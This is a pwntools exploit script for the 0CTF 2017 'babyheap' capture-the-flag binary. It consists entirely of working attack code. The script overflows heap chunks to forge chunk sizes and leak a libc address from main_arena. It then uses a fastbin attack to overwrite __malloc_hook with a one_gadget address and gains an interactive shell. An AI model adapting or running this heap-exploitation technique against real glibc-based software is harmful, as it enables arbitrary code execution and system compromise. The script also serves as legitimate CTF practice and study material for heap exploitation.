from pwn import *
# context.log_level = 'debug'
io = process('./babyheap_0ctf_2017')
Libc = ELF('/home/bamuwe/pwn_tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')
def cmd(num):
    io.sendlineafter(b'Command: ',str(num))
def alloc(size):
    cmd(1)
    io.sendlineafter(b'Size: ',str(size))
def fill(idx,content):
    cmd(2)
    io.sendlineafter(b'Index: ',str(idx))
    io.sendlineafter(b'Size: ',str(len(content)))
    io.sendafter(b'Content: ',content)
def free(idx):
    cmd(3)
    io.sendlineafter(b'Index: ',str(idx))
def dump(idx):
    cmd(4)
    io.sendlineafter(b'Index: ',str(idx))
    io.recvuntil(b'Content: \n')
    main_arena = u64(io.recv(6).ljust(8,b'\x00'))
    malloc_hook = main_arena-88-0x10
    print('main_arena_addr->',hex(main_arena))
    print('malloc_hook->',hex(malloc_hook))
    return malloc_hook
    
alloc(0x10) #0
alloc(0x10) #1
alloc(0x10) #2
alloc(0x10) #3 
alloc(0x80) #4

free(1)
free(2)

payload1 = p64(0xdeadbeef)*3+p64(0x21)+p64(0x0)+p64(0xdeadbeef)*2+p64(0x21)+p8(0x80)
fill(0,payload1)

payload2 = p64(0xdeadbeef)*2+p64(0)+p64(0x21)
fill(3,payload2)
alloc(0x10)
alloc(0x10)

# fill(1,'aaaa')
# fill(2,'bbbb')    #for_sign
payload3 = p64(0xdeadbeef)*2+p64(0)+p64(0x91)
fill(3,payload3)
alloc(0x90)
free(4)
malloc_hook = dump(2)
Libc_offset = malloc_hook-Libc.sym['__malloc_hook']
#leak_over

alloc(0x60)
free(4)
payload4 = p64(Libc_offset+Libc.sym['__malloc_hook']-0x23)
fill(2, payload4)

alloc(0x60)
alloc(0x60)
payload5 = p8(0)*3+p64(0)*2+p64(Libc_offset+0x4527a)

fill(6, payload5)
alloc(1)
# gdb.attach(io)
# pause()
io.interactive()